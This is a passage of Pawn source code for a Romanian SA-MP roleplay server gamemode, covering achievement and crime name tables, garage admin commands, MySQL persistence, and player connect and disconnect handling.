#pragma warning disable 213

#include "./src/data/resource.pwn"
#include "./src/variable.pwn"
#include "./src/blackjack.pwn"
#include "./src/mysql.pwn"
#include "./src/functions.pwn"
#include "./src/special_quests/autumn.pwn"
#include "./src/systems.pwn"
#include "./src/svf.pwn"
#include "./src/race.pwn"
#include "./src/admins.pwn"
#include "./src/airdrop.pwn"
#include "./src/rouletta.pwn"
#include "./src/atm.pwn"
#include "./src/slots_machine.pwn"
#include "./src/panel.pwn"
#include "./src/backpack.pwn"
#include "./src/helpers.pwn"
#include "./src/clans.pwn"
#include "./src/custom_number.pwn"
#include "./src/lotto.pwn"
#include "./src/BattlePass.pwn"
#include "./src/dailycollect.pwn"

stock achievementNames(id) {
	gString[0] = (EOS);
	switch(id) {
		case 0: gString = "Cumpara o pereche de ochelari";
		case 1: gString = "Cumpara o palarie";
		case 2: gString = "Obtine licenta de condus";
		case 3: gString = "Adauga un prieten in lista";
		case 4: gString = "Finalizeaza o cursa";
		case 5: gString = "Omoara un politist";
		case 6: gString = "Jefuieste o afacere";
		case 7: gString = "Obtine licenta de port arme";
		case 8: gString = "Obtine licenta de zbor";
		case 9: gString = "Obtine licenta de navigatie";
		case 10: gString = "Scapa de wanted";
		case 11: gString = "Evadeaza din jail";
		case 12: gString = "Intra intr-un departament";
		case 13: gString = "Intra intr-o mafie";
		case 14: gString = "Intra intr-o factiune mixta";
		case 15: gString = "Achizitioneaza o casa";
		case 16: gString = "Achizitioneaza un vehicul";
		case 17: gString = "Obtine rank 5 intr-o factiune";
		case 18: gString = "Obtine functia de helper";
		case 19: gString = "Achizitioneaza un job";
		case 20: gString = "Achizitioneaza un biz";
		case 21: gString = "Obtine functia de lider";
		case 22: gString = "Achizitioneaza o masina din Dealership";
		case 23: gString = "Achizitioneaza un slot de vehicule";
		case 24: gString = "Deschide giftbox-ul";
		case 25: gString = "Deschide un crate premium";
		case 26: gString = "Acumuleaza 200 kill-uri la Paintball";
		case 27: gString = "Detine un skin premium";
		case 28: gString = "Pune sistem VIP unei masini";
		case 29: gString = "Pune sistem rainbow unei masini";
		case 30: gString = "Obtine functia de admin";
		case 31: gString = "Atinge numarul de 100 de zile intr-o factiune";
		case 32: gString = "Creaza un clan";
		case 33: gString = "Obtine functia de tester in cadrul unei factiuni";
		case 34: gString = "Obtine skill 6 la un job";
	}	
	return gString;
}


stock ticketName(id) {
	gString[0] = EOS;
	switch(id) {
		case 0: gString = "- Folosirea de NOS";
		case 1: gString = "- Headlights off (Faruri oprite)";
		case 2: gString = "- Condus fara casca";	
	}
	return gString;
}
stock wantedName(id) {
	new string[64];
	switch(id) {
		case 0: string = "Furt Vehicul";
		case 1: string = "Apel Nefondat 112";
		case 2: string = "Atacare Civil";
		case 3: string = "Neconformare Ordin";
		case 4: string = "Patrundere Teren Guvernamental";
		case 5: string = "Rapire Civil";
		case 6: string = "Posesie/Folosire Droguri";
		case 7: string = "Atacare Politist";
		case 8: string = "Neplata Amenda";
		case 9: string = "Drive-By";
		case 10: string = "Mituire Politist";
		case 11: string = "Omorare Civil";
		case 12: string = "Rapire Politist";
		case 13: string = "Omorare Politist";
		case 14: string = "Fugar";
		case 15: string = "Complice";		
	}
	return string;
}



stock SetPlayerPosEx(playerid, Float:x, Float:y, Float:z) {
	SetPlayerPos(playerid, (LastPos[playerid][0]=x), (LastPos[playerid][1]=y), (LastPos[playerid][2]=z));
	Exception[playerid] = 2;
	return true;
} 

#if defined _ALS_SetPlayerPos
    #undef SetPlayerPos
#else
    #define _ALS_SetPlayerPos
#endif
#define SetPlayerPos SetPlayerPosEx

stock Float:GetDistanceBetweenPlayers(p1,p2,Float:x=0.0,Float:y=0.0,Float:z=0.0) return GetPlayerPos(p1, x, y, z), GetPlayerDistanceFromPoint(p2, x, y, z);

#define DistanceToPlayer(%0,%1) \
	GetDistanceBetweenPlayers(%0,%1)

stock Float:GetDistanceFromDistance(Float:x,Float:y,Float:z, Float:_x, Float:_y, Float:_z) return VectorSize(x-_x, y-_y, z-_z);

public OnGameModeExit() {
	DestroyActor(SpawnActor); Iter_Clear(server_Vehicles);
	_query("UPDATE `stuff` SET `goal`='%s'", valueBigInt(serverGoal));
	_query("UPDATE `stuff` SET `lotto_bets`='%d'", sql_lotto_bets);
	mysql_tquery(SQL, gQuery, "UPDATE `users` SET `Status` = '-1'");

	for(new i=0;i<MAX_CLANS;i++) if(!ClanInfo[i][cID]) _query("UPDATE `clans` SET `Safebox` = '%i' WHERE `ID` = '%i'", ClanInfo[i][ClanBank], ClanInfo[i][cID]);
	for(new i=1;i<=bussines;i++) _query("UPDATE `bizz` SET `Till`='%d',`Products`='%d' WHERE `ID`='%d'", BizzInfo[i][bBalance],BizzInfo[i][bProducts], BizzInfo[i][bID]);
	for(new i=0;i<MAX_JOBS;i++) _query("UPDATE `jobs` SET `Balance` = '%i' WHERE `ID` = '%i'", JobInfo[i][jBalance], JobInfo[i][jID]);
	return mysql_close(SQL);
}

save_shards(playerid) {
	mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `shards` = '%i %i %i' WHERE `id` = '%i'", PlayerInfo[playerid][pShard][0], PlayerInfo[playerid][pShard][1], PlayerInfo[playerid][pShard][2], PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gQuery);
}

#define IsValidVehicleModelNos(%0) Iter_Contains(IsValidNos, %0)

redist::sql_load_garages() {
	sql_garages=cache_num_rows();
	printf("[MySQL]\t\t\tgarages\t\t\t%d", sql_garages);
	if(!sql_garages) return true;
	new i,areaid;
	while(i<sql_garages) {
		cache_get_value_name_int(i, "ID", GarageInfo[i][gID]);
		cache_get_value_name_float(i, "EntranceX", GarageInfo[i][gEnterX]);
		cache_get_value_name_float(i, "EntranceY", GarageInfo[i][gEnterY]);
		cache_get_value_name_float(i, "EntranceZ", GarageInfo[i][gEnterZ]);
		cache_get_value_name_int(i, "House", GarageInfo[i][gHouses]);
		areaid = CreateDynamicSphere(GarageInfo[i][gEnterX], GarageInfo[i][gEnterY], GarageInfo[i][gEnterZ], 5.0);
		AreaType[areaid] = AREA_GARAGE;
		AreaID[areaid] = i;
		UpdateLabel(3, i);
		i++;
	}
	return true;
}

cmd:createeatstand(playerid, params[]) {
	if(!IsAdmin(playerid, 7))
		return true;

	new Float:x,Float:y,Float:z;
	GetPlayerPos(playerid, x, y, z);
	new object = CreateDynamicObject(1342, x+random(3), y+random(3), z, 0.0, 0.0, 0.0);
	EditDynamicObject(playerid, object);
	editObjectType[playerid] = 4;
	SendClientMessage(playerid, COLOR_YELLOW, "Edit object started!");
	return true;
}

cmd:creategarage(playerid, params[]) {
	if(!IsAdmin(playerid, 6)) return SendErrorMsg(playerid, AdminOnly);
	extract params -> new houseid; else return SendUsageMsg(playerid, "creategarage [house id]");	
	if(!(0 <= houseid <= sizeof HouseInfo)) return SendErrorMsg(playerid, "Invalid House ID");	
	if(!HouseInfo[houseid][hID]) return SendErrorMsg(playerid, "Invalid house!");
 
	for(new i = 0; i < sizeof GarageInfo; i++) if(GarageInfo[i][gHouses]==houseid) return SendErrorMsg(playerid, "Aceasta casa are deja un garaj!");

	new g=sql_garages; GarageInfo[g][gHouses] = houseid;
	GetPlayerPos(playerid, GarageInfo[g][gEnterX], GarageInfo[g][gEnterY], GarageInfo[g][gEnterZ]);
	mysql_format(SQL, gQuery, 256, "INSERT INTO `garages` (`EntranceX`, `EntranceY`, `EntranceZ`, `House`) VALUES ('%f', '%f', '%f', '%i')", GarageInfo[g][gEnterX], GarageInfo[g][gEnterY], GarageInfo[g][gEnterZ], GarageInfo[g][gHouses]);
	mysql_tquery(SQL, gQuery, "sql_insert_garage", "ii", playerid, g);
	return true;
}

redist::sql_insert_garage(playerid, g) {
	GarageInfo[g][gID] = cache_insert_id(); 
	new areaid = CreateDynamicSphere(GarageInfo[g][gEnterX], GarageInfo[g][gEnterY], GarageInfo[g][gEnterZ], 5.0);
	SendAdminMessage(COLOR_LIGHTRED, "Admin-ul %s a creat un garaj (ID: %d) pentru casa %d.", 1, GetName(playerid), GarageInfo[g][gID], GarageInfo[g][gHouses]);
	AreaType[areaid] = AREA_GARAGE; AreaID[areaid] = g; sql_garages++;
	return UpdateLabel(3, g);
}

cmd:movegarage(playerid, params[]) {
	if(!IsAdmin(playerid, 7)) return true;

	if(sscanf(params, "i", params[0]))
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/movegarage <garageid>");

	params[0]--;
	if(params[0] < 0 || params[0] >= sizeof GarageInfo)
		return SendClientMessage(playerid, COLOR_GREY, "Invalid garage!");

	if(GarageInfo[params[0]][gID]==-1) 
		return SendClientMessage(playerid, COLOR_GREY, "Invalid garage!");

	UpdateLabel(params[0], 3);
	format(gString, 128, "(/creategarage) {FFFFFF}Admin %s a modificat garajul (ID: %d).", GetName(playerid), GarageInfo[params[0]][gID]);
	SendAdminMessage(COLOR_LIGHTRED, gString, 5);
	GetPlayerPos(playerid, GarageInfo[params[0]][gEnterX], GarageInfo[params[0]][gEnterY], GarageInfo[params[0]][gEnterZ]);
	mysql_format(SQL, gQuery, 128, "UPDATE `garages` SET `EntranceX` = '%f', `EntranceY` = '%f', `EntranceZ` = '%f' WHERE `ID` = '%i'", GarageInfo[params[0]][gEnterX], GarageInfo[params[0]][gEnterY], GarageInfo[params[0]][gEnterZ], GarageInfo[params[0]][gID]);
	mysql_tquery(SQL, gQuery);
	return true;
}

cmd:findgarage(playerid, params[]) {
	if(CP[playerid] != 0 || targetfind[playerid] != -1) 
		return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Checkpoint", "Ai deja un checkpoint.\nDoresti sa-l anulezi? Daca da, apasa pe 'Ok'.", "Ok", "Exit");

	if(sscanf(params, "i", params[0]))
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/findgarage <garage ID>");

	params[0]--;
	if(params[0] < 0 || params[0] >= sizeof GarageInfo)
		return SendClientMessage(playerid, COLOR_GREY, "Invalid garage ID!");

	if(GarageInfo[params[0]][gID]==-1) 
		return SendClientMessage(playerid, COLOR_GREY, "Invalid garage ID!");

	SCMf(playerid, COLOR_YELLOW, "Follow checkpoint to reach to the garage. %d. Distance: %.2fm", GarageInfo[params[0]][gID], GetPlayerDistanceFromPoint(playerid, GarageInfo[params[0]][gEnterX], GarageInfo[params[0]][gEnterY], GarageInfo[params[0]][gEnterZ]));
	SetPlayerCheckpoint(playerid, GarageInfo[params[0]][gEnterX], GarageInfo[params[0]][gEnterY], GarageInfo[params[0]][gEnterZ], 2.5);
	CP[playerid] = 53;
	return true;
}

redist::SQL_cacheserver() {
	if(!cache_num_rows()) 
		return true;
	
	new name[50], pw[30];
	cache_get_value_name(0, "Name", name);
	cache_get_value_name(0, "Password", pw);
	gString[0] = EOS;
	format(gString, 60, "hostname %s", name);
	SendRconCommand(gString);
	format(gString, 128, "password %s", pw);
	SendRconCommand(gString);
	foreach(new i : Player) KickEx(i);
	return true;
}

public OnPlayerConnect(playerid) {
	if(Iter_Count(LoginQueue<1>) >= MAX_LOGIN_WAITING)
		return 
			SendClientMessage(playerid, COLOR_SERVER, "SERVER SUPRA SOLICITAT: Te rog revino peste 30 de secunde!"),
			KickEx(playerid);

    TogglePlayerControllable(playerid, false);
	SetPlayerScore(playerid, 0);
	resetPvar(playerid);
	GetPlayerName(playerid, PlayerInfo[playerid][pUsername], MAX_PLAYER_NAME);
	GetPlayerIp(playerid, playerIP[playerid], 16);
	new rando = random(sizeof(spawn_random));
	SetSpawnInfo(playerid, 0, 0, spawn_random[rando][0], spawn_random[rando][1], spawn_random[rando][2], spawn_random[rando][3], -1, -1, -1, -1, -1, -1);
	if FaceReclama(PlayerInfo[playerid][pUsername]) *then
		return SendClientMessage(playerid, COLOR_WARNING, "Ai primit kick deoarece numele tau contine numele unei comunitati!"), BlockIpAddress(playerIP[playerid], 5 * 60 * 1000);

	if(Iter_Contains(air_Players, playerid)) Iter_Remove(air_Players, playerid);
	if(give_arrow[playerid]) {
		collectGift[playerid] = false;
		if(p_AirDropLabel[playerid]!=Text3D:INVALID_3DTEXT_ID) DestroyDynamic3DTextLabel(p_AirDropLabel[playerid]), p_AirDropLabel[playerid]=Text3D:INVALID_3DTEXT_ID;
		if(p_AirDropObject[playerid]!=INVALID_OBJECT_ID) DestroyPlayerObject(playerid, p_AirDropObject[playerid]), p_AirDropObject[playerid]=INVALID_OBJECT_ID;
	}
	SetPlayerWorldBounds(playerid, 3579.6602, -4298.7334, 3971.8860, -3909.0200);
	SetPlayerColor(playerid, COLOR_GRAD2);

	LoginQueuePTD[playerid] = CreatePlayerTextDraw(playerid, 315.666626, 138.148148, "Loading info..");
	PlayerTextDrawLetterSize(playerid, LoginQueuePTD[playerid], 0.400000, 1.600000);
	PlayerTextDrawTextSize(playerid, LoginQueuePTD[playerid], 0.000000, 741.000000);
	PlayerTextDrawAlignment(playerid, LoginQueuePTD[playerid], 2);
	PlayerTextDrawColor(playerid, LoginQueuePTD[playerid], 0xFFFFFFFF);
	PlayerTextDrawUseBox(playerid, LoginQueuePTD[playerid], 1);
	PlayerTextDrawBoxColor(playerid, LoginQueuePTD[playerid], 0x00000066);
	PlayerTextDrawSetShadow(playerid, LoginQueuePTD[playerid], 0);
	PlayerTextDrawSetOutline(playerid, LoginQueuePTD[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, LoginQueuePTD[playerid], 0x000000FF);
	PlayerTextDrawFont(playerid, LoginQueuePTD[playerid], 2);
	PlayerTextDrawSetProportional(playerid, LoginQueuePTD[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, LoginQueuePTD[playerid], 0);
	PlayerTextDrawShow(playerid, LoginQueuePTD[playerid]);

	SetGVarInt(playerIP[playerid], GetGVarInt(playerIP[playerid]) + 1);
	if GetGVarInt(playerIP[playerid]) > 2 *then return BlockIpAddress(playerIP[playerid], 10 * 60 * 1000);

	if(Iter_Count(LoginQueue<0>) < MAX_LOGIN) LoginTime[playerid][(LoginTime[playerid][0]=1)] = 4, Iter_Add(LoginQueue<0>, playerid);
	else Iter_Add(LoginQueue<1>, playerid);
	return true; 
}

redist::GameModeInitExitFunc() {
	foreach(new i : logged_players) {
		DisablePlayerCheckpointEx(i);
	    SetPlayerCameraPos(i, 1460.0, -1324.0, 287.2);
	    SetPlayerCameraLookAt(i,1374.5, -1291.1, 239.0);
	}
	GameModeExit();
	return true;
}
SavePlayerBank(playerid) {
	gQuery[0] = EOS;
	mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `Bank`='%s' WHERE `id`='%d'", valueBigInt(bank[playerid]), PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gQuery); 
}

stock getKillPaintType(playerid) {
	if(lastKill[playerid]==1) return true;
	new const e_Kills[7][20] = {{"None"}, {"None"}, {"double"}, {"triple"}, {"quadra"}, {"penta"}, {"legendary"}};
	foreach(new i : InPaint<PaintType[playerid]-1>) va_GameTextForPlayer(i, "~y~%s: ~w~~h~%s kill", 5000, 4, GetName(playerid), e_Kills[lastKill[playerid]>6?6:lastKill[playerid]]);
	return true;
}

task updatePlayerAccount[ACCOUNT_UPDATE_TIME]() {
	foreach(new playerid : logged_players) {
		mysql_format(SQL, gString, sizeof gString, "UPDATE `users` SET `Money`='%s', `goal` = '%i', `DailyActivity` = '%i', `Jailed`='%i',`Muted`='%i',`MuteTime`='%i', `Respect` = '%i', `GoldPoints` = '%i', `WantedTime` = '%i', `JailTime` = '%i', `GiftPoints` = '%i', `BPoints` = '%i', `CasinoCredit` = '%i' WHERE `id` = '%i'", 
			valueBigInt(money[playerid]), PlayerInfo[playerid][pJobGoal], PlayerInfo[playerid][pDailyActivity], PlayerInfo[playerid][pJailed], PlayerInfo[playerid][pMuted], PlayerInfo[playerid][pMuteTime], 
			PlayerInfo[playerid][pExp], PlayerInfo[playerid][pPremiumPoints], WantedTime[playerid], PlayerInfo[playerid][pJailTime], PlayerInfo[playerid][pGiftPoints], PlayerInfo[playerid][pBPoints], PlayerInfo[playerid][pCasinoCredit], PlayerInfo[playerid][pSQLID]);
		mysql_tquery(SQL, gString);
	}
	return true;
}

public OnPlayerDisconnect(playerid, reason)
{
	if(!IsPlayerLogged(playerid)) return true;
	Iter_Remove(LoginQueue<0>, playerid);
	Iter_Remove(LoginQueue<1>, playerid);
	Iter_Remove(faction_leaders, playerid);
	Iter_Remove(Staff<HELPER>, playerid);
	Iter_Remove(youtubers, playerid); 
	Iter_Remove(IsSpeed, playerid); 
	Iter_Remove(PlayerVips<NORMAL>, playerid); 
	Iter_Remove(PlayerVips<LEGEND>, playerid); 
	Iter_Remove(IsRuletta, playerid);
	Iter_Remove(logged_players, playerid);
	Iter_Clear(player_in_blocks[playerid]);
	Iter_Remove(PlayerPremiums, playerid); 
	Iter_Remove(Staff<ADMIN>, playerid);
	OnPlayerLeftQuery(playerid);
	SetGVarInt(playerIP[playerid], GetGVarInt(playerIP[playerid]) - 1);
	destroySVF(playerid);
	stop_rob(playerid);
    
	
	for(new i=0,j=sizeof rob_camera_pos;i!=j;i++) DestroyDynamicObject(camera_obj[playerid][i][0]), DestroyDynamicObject(camera_obj[playerid][i][1]);
	if(GetGVarInt(playerIP[playerid]) < 1) DeleteSVar(playerIP[playerid]);
	if(IsPlayerInAnyVehicle(playerid)) OnPlayerStateChange(playerid, PLAYER_STATE_SPAWNED, GetPlayerState(playerid)==PLAYER_STATE_DRIVER?PLAYER_STATE_DRIVER:PLAYER_STATE_PASSENGER);
	if(HavePhone(playerid)) DeleteSVar(PlayerInfo[playerid][pPhone]);
	if(IsPlayerInAnyVehicle(playerid)) {
		Iter_Remove(RadioCount<CarRadio[GetPlayerVehicleID(playerid)]>, playerid);
		Iter_Remove(VehOccupeid<GetPlayerVehicleID(playerid)>, playerid);
	}
	if(player_selected[playerid] == 19) removePlayerFromBl(playerid, bl_slot_id[playerid][1]);
	if(PlayerInfo[playerid][pWTalkie]) Iter_Remove(freq_members<WTChannel[playerid]>, playerid);
	if(AdTimer[playerid]) total_ads--, AdTimer[playerid] = 0;
	if(Iter_Contains(clan_players<SpecClan[playerid]>, playerid)) Iter_Remove(clan_players<SpecClan[playerid]>, playerid);
	if(CrateModel[playerid] != -1) PlayerInfo[playerid][pCrates][CrateModel[playerid]]++,save_crates(playerid);
	if(InWarTurf[PlayerInfo[playerid][pMember]] != -1) _query("UPDATE `users` SET `WarKills` = '%i', `WarDeaths` = '%i', `Materials` = '%i' WHERE `id` = '%i'", WarKills[playerid], WarDeaths[playerid], PlayerInfo[playerid][pMats], PlayerInfo[playerid][pSQLID]);

	if(Iter_Contains(race_players, playerid)) {
		if(raceVoted[playerid][0]!=-1) race_map_votes[raceVoted[playerid][0]]--;
		raceVoted[playerid][1] = false;
		sendRaceMessage(COLOR_CLIENT, "%s has left the race arena on place %d.", GetName(playerid), player_race_pos[playerid]);
		destroy_race_vehicle(playerid);
	}
	if(Iter_Contains(report_players, playerid)) {Iter_Remove(report_players, playerid);show_admin_report();}
	for(new i=0;i<9;i++) {
		if(Iter_Contains(servicePlayers<i>, playerid)) Iter_Remove(servicePlayers<i>, playerid);
		if(AcceptedPlayerService[playerid][i]!=-1) {
			new id = AcceptedPlayerService[playerid][i];
			AcceptedPlayerService[playerid][i] = -1;
			if(id!=-1) {
				SCMf(id, COLOR_YELLOW, "* %s s-a desconectat de pe server!", GetName(playerid));
				PlayerTextDrawHide(id, FindSkinTD);
				PlayerTextDrawHide(id, FindTD);
				targetfind[id] = -1;
				CP[id] = 0;
				DisablePlayerCheckpointEx(id);
				AcceptedService[id] = -1;
			}
			AcceptedPlayerService[playerid][i]=-1;
		}
	}
	if(DealerCar[playerid]) DestroyVehicleEx(DealerCar[playerid], ""), DealerCar[playerid] = 0;
	stopWork(playerid); 
	for(new i=0,j=sizeof g_Tree;i<j;i++) DestroyDynamicObject(TreeObj[playerid][i]);
	for(new i=0,j=sizeof stone_object;i!=j;i++) DestroyDynamicObject(_stoneObj[playerid][i]);
	if(PaintType[playerid]) {
		SendPaintMessage(PaintType[playerid], COLOR_LIGHTGOLD, "%s has left the paintball arena.", GetName(playerid));
		Iter_Remove(InPaint<PaintType[playerid]-1>, playerid);
		PaintType[playerid] = 0;
	}
	if(Iter_Count(MySpec<playerid>)) {
		foreach(new i : MySpec<playerid>) TogglePlayerSpectating(i, false);
		Iter_Clear(MySpec<playerid>);
	}
	if(Spectate[playerid]!=-1) Iter_Remove(MySpec<Spectate[playerid]>, playerid), Iter_Remove(StreamedPlayer[Spectate[playerid]], playerid);
	if(Pet[playerid]) {
		RemovePlayerAttachedObject(playerid, 6);
		DestroyDynamic3DTextLabel(Pet[playerid]);
	}
	format(gString, sizeof gString, "%s(%d) s-a deconectat de pe server. [money: $%s | bank: $%s | pp: %d | bp: %d]", GetName(playerid), playerid, formatBytes(money[playerid]), formatBytes(bank[playerid]), PlayerInfo[playerid][pPremiumPoints], PlayerInfo[playerid][pBPoints]);
	InsertLog(playerid, gString, LOG_MONEY);
 	destroy_rent_car(playerid);
	for(new i=0;i<3;i++) if(Iter_Contains(Rainbows<i>, playerid)) Iter_Remove(Rainbows<i>, playerid);
	Delete3DTextLabel(deathLabel[playerid]);
	Delete3DTextLabel(vipLabel[playerid]);
	if(Iter_Count(MyVehicle<playerid>)) {
		foreach(new idd : MyVehicle<playerid>) {
			DestroyPlayerCar(idd);
			mysql_format(SQL, gQuery, 256, "UPDATE `cars` SET `Lockk` = '%i', `KM` = '%.4f', `Fuel` = '%i' WHERE `ID` = '%i'", CarInfo[idd][cLock], CarInfo[idd][KM], CarInfo[idd][cFuel], CarInfo[idd][cID]);
			mysql_tquery(SQL, gQuery);
			CarInfo[idd][cTime] = 0;
		}
		Iter_Clear(MyVehicle<playerid>);
	}
	
	if(TradeID[playerid] != -1) {
		new id = TradeID[playerid];
		SCMf(playerid, COLOR_GOLD, "* %s s-a deconectat. Afacere anulata!", GetName(playerid));
		SCMf(id, COLOR_GOLD,"* %s s-a deconectat. Afacere anulata!", GetName(playerid));
		CancelSelectTextDraw(id);
		DestroyTradeItems(id);
	}
	Iter_Remove(Acovers, playerid);
	if(InExamen[playerid]) FailExamen(playerid);
	new bool:count=false,names[128], string[128];
	if(PlayerInfo[playerid][pWantedLevel] != 0) {
		foreach(new i : StreamedPlayer[playerid]) {
			if(IsACop(i) && CrimInRange(50.0, playerid,i) && OnDuty[i]) {
				count=true;
				format(string, sizeof(string), "running suspect bonus!");
				GameTextForPlayer(i, string, 3000, 1);
				GivePlayerCash(i, PlayerInfo[playerid][pWantedLevel] * 2000);
				AddFactionRaport(i, 0);		

				format(string, sizeof(string), "Ai primit $%d bonus pentru prinderea suspectului %s.", PlayerInfo[playerid][pWantedLevel] * 2000, GetName(playerid));
				SendClientMessage(i, COLOR_DBLUE, string);
				format(names, sizeof names, "%s %s", names, GetName(i));
				SCMf(i, COLOR_PURPLE, "* %s is now in jail thanks to: %s", GetName(playerid), GetName(i));
			}					
		}
		if(count) {
			SendTeamMessage(PlayerInfo[playerid][pMember], COLOR_LIGHTBLUE, "Dispatch: %s has been killed by No One and will be in jail for %d seconds, over.", GetName(playerid), (PlayerInfo[playerid][pWantedLevel])*(150));
			
			GivePlayerCash(playerid, -(PlayerInfo[playerid][pWantedLevel] * 2000));
			PlayerInfo[playerid][pWantedDeaths] += 1;
			PlayerInfo[playerid][pJailed] = 1;
			PlayerInfo[playerid][pJailTime] = (PlayerInfo[playerid][pWantedLevel])*(250);
			PlayCopSound();
			format(string, sizeof(string), "Because you got killed, you lost $%d and you will be taken to jail. You are no longer a criminal.", PlayerInfo[playerid][pJailTime], PlayerInfo[playerid][pWantedLevel] * 2000);
			SendClientMessage(playerid, COLOR_LIGHTRED, string);
			
			TogglePlayerControllable(playerid, 0);
			SetPlayerFreeze(playerid, 2);
			PlayerInfo[playerid][pWantedLevel] = 0;
			PlayerTextDrawHide(playerid, WantedTD);
			SetPlayerWantedLevel(playerid, 0);
			ClearCrime(playerid);	
		}
	}	

	if(HaveHelp[playerid]!=-1) {
		Iter_Add(newbie_players, HaveHelp[playerid]);
		SendClientMessage(HaveHelp[playerid], COLOR_LGREEN, "Helperul anterior a sarit peste intrebarea ta. Asteapta pana cand cineva iti va raspunde!");
		HaveHelper[HaveHelp[playerid]] = -1;
		HaveHelp[playerid] = -1;
	}
	if(HaveHelper[playerid]!=-1) {
		new helperID = HaveHelper[playerid];
		format(gString, 128, "(/n) %s s-a desconectat in timp ce intrebarea lui era la %s.", GetName(playerid), GetName(playerid), GetName(helperID));
		SendAdminMessage(0xFFADADFF, gString, 1);
		HaveHelp[helperID] = -1;
		HaveHelper[playerid]=-1;
	}
	if(Iter_Contains(newbie_players, playerid)) Iter_Remove(newbie_players, playerid);
	if(Mobile[playerid] != -1) {
		CellTime[Mobile[playerid]] = 0;
		CellTime[playerid] = 0;
		Mobile[Mobile[playerid]] = -1;
		PlayerTextDrawHide(playerid, ChatCMD);
		PlayerInfo[playerid][pChatCMD] = 0;
		PlayerTextDrawHide(Mobile[playerid], ChatCMD);
		PlayerInfo[Mobile[playerid]][pChatCMD] = 0;
		PlayerInfo[playerid][pSpeaker] = 0;
		PlayerInfo[Mobile[playerid]][pSpeaker] = 0;
		SetPlayerSpecialAction(Mobile[playerid],SPECIAL_ACTION_STOPUSECELLPHONE);
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
		Mobile[playerid] = -1;
	}
	if(TaxiDriver[playerid] != -1) {
		if(TaxiMoney[playerid] != 0) {
			AddFactionRaport(playerid, 0);					
			AcceptedService[TaxiDriver[playerid]] = -1;
			foreach(new i : StreamedPlayer[playerid]) {
				if(IsNearPlayer(playerid, i)) {
					format(string, sizeof(string), "* %s a platit taximetristului %s suma de $%s pentru cursa efectuata.", GetName(playerid), GetName(TaxiDriver[playerid]), FormatNumber(TaxiMoney[playerid]));
					SendClientMessage(i, COLOR_PURPLE, string);
				}
			}
			TaxiMoney[playerid] = 0;
		}
		TaxiDriver[playerid] = -1;
		PlayerTextDrawHide(playerid, FareTD);
	}
	if(InLesson[playerid]!=-1) {
		SCMf(InLesson[playerid], COLOR_LIGHTBLUE, "Lectia a fost anulata deoarece %s s-a deconectat.", GetName(playerid));
		InLesson[InLesson[playerid]] = -1;
		InLesson[playerid] = -1;	
	}
	SetPlayerName(playerid, PlayerInfo[playerid][pUsername]);		
	if(PlayerHit[playerid] != -1) {
		Iter_Add(servicePlayers<7>, PlayerHit[playerid]);
		PlayerHit[playerid] = -1;
	} 		
	if(StartedSpray[playerid] == 1 || ClanDuty[playerid] == 1) {
		new i = StartedSprayOn[playerid], cl = GraffitiInfo[i][gfOwned];
		format(gString, 180, "{%s}(Clan) {FFFFFF}%s (din clanul %s) nu a reusit sa deseneze complet peretele (turf id %d).", ClanInfo[cl][clColor], GetName(playerid), ClanInfo[PlayerInfo[playerid][pClan]][clName], GraffitiInfo[i][gfID]);
		SendClanMessage(GraffitiInfo[i][gfOwned], gString);
		GangZoneStopFlashForAll(ClanTurfs[i]);
		GraffitiInfo[StartedSpray2[playerid]][gfAttacked] = 0;
		StartedSpray[playerid] = 0;
		StartedSpray2[playerid] = 0;
		GraffitiInfo[i][gfAttacked] = 0;
		GraffitiInfo[i][gfPlayerSpray] = 0;
		StartedSprayOn[playerid] = 0;
		ClanProces[playerid] = 0;
		ClanDuty[playerid] = 0;
	}
	new left_reson[5][30] = {"Timeout/Crash", "Ouit", "Kick/Ban", "Custom", "Mode End"};
	if(PlayerInfo[playerid][pAdmin] != 0) {
		if(Iter_Contains(Staff<ADMIN>, playerid)) Iter_Remove(Staff<ADMIN>, playerid);
		SendAdminMessage(COLOR_LOGS, "QuitBot: Admin %s left the game. (%s)", 1, GetName(playerid), left_reson[reason]);
	}		
	if(Iter_Contains(clan_players<PlayerInfo[playerid][pClan]>, playerid)) {
		Iter_Remove(clan_players<PlayerInfo[playerid][pClan]>, playerid);
		SendClanMessage(PlayerInfo[playerid][pClan], "{A9C4E4}(Clan) {FFFFFF}%s from your clan has desconnected. (%s).", GetName(playerid), left_reson[reason]);
	}
    if(PlayerInfo[playerid][pMember] != 0 && PlayerInfo[playerid][pRank] > 0) {
    	Iter_Remove(faction_players<PlayerInfo[playerid][pMember]>, playerid);
		new id;
		if((id=AcceptedService[playerid])!=-1) {
			new f=0;
			switch(PlayerInfo[playerid][pMember]) {
				case 12: SCMf(id, COLOR_YELLOW, "Taximetristul %s s-a deconectat. Asteapta pana cand comanda ta va fi preluata de alti membri.", GetName(playerid)),f=0;
				case 15: SCMf(id, COLOR_YELLOW, "Uberul %s s-a deconectat. Asteapta pana cand comanda ta va fi preluata de alti membri.", GetName(playerid)),f=1;
				case 23: SCMf(id, COLOR_YELLOW, "Yango %s s-a deconectat. Asteapta pana cand comanda ta va fi preluata de alti membri.", GetName(playerid)),f=2;
				case 13: SCMf(id, COLOR_YELLOW, "Paramedicul %s s-a deconectat. Asteapta pana cand comanda ta va fi preluata de alti membri.", GetName(playerid)),f=3;
				case 8: SCMf(id, COLOR_YELLOW, "Mechanicul %s s-a deconectat. Asteapta pana cand comanda ta va fi preluata de alti membri.", GetName(playerid)),f=4;
				case 9: SCMf(id, COLOR_YELLOW, "Instructorul %s s-a deconectat. Asteapta pana cand comanda ta va fi preluata de alti membri.", GetName(playerid)),f=5;
			}
			format(gString, 180, "* Membrul %s s-a deconectat in timp ce avea comanda lui %s (%d). Aceasta comanda este acum disponibila membrilor.", GetName(playerid), GetName(AcceptedService[playerid]), AcceptedService[playerid]);
			SendFactionMessage(PlayerInfo[playerid][pMember], 0x2C6CBFFF, gString);
			Iter_Add(servicePlayers<f>, id);
			AcceptedService[playerid] = -1;
		}
